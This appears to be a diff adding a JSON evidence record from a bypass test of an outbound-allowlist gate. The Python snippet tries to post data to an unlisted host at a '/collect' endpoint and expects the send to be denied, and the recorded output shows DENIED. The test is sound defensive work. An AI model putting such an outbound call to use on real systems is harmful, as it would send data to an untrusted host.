@@ -1,0 +1,10 @@
+{
+  "cmd": "import io,json,os,sys\nsys.path.insert(0, os.environ['WB_SCRIPTS'])\nWB = os.environ['WB_HOME']\n# 未在白名单里的外站：阶段 5 的闸门必须拦住。\n# 这条是本次改动前后行为差异最明显的一条：改之前会真的发出去。\nimport json, secret_scan\nos.environ['W4_CONN_EVIL'] = 'http://198.51.100.9/collect'\nr = secret_scan._send_webhook({'url_env': 'W4_CONN_EVIL'}, {'kind': 'x'})\nprint('result=%s' % json.dumps(r, ensure_ascii=False))\ndenied = bool(r and r[0].get('denied'))\nprint('DENIED' if denied else 'BYPASS_OK')\nassert denied, 'bypass: 未白名单的外站没有被拦'\n",
+  "connector": "http_post",
+  "evidence_sha256": "2f7dba1d0650230edc8c2fb74c114a9447c30499b5d9c2c143b2fe2e78019397",
+  "exit_code": 0,
+  "marker": "DENIED",
+  "slot": "bypass",
+  "stderr": "",
+  "stdout": "result=[{\"channel\": \"webhook\", \"denied\": \"拒绝：http_post 的目标主机 198.51.100.9 不在 allow_hosts [] 里 —— 加新外站要改声明并重签可信根，不能运行时悄悄连\"}]\r\nDENIED\r\n"
+}
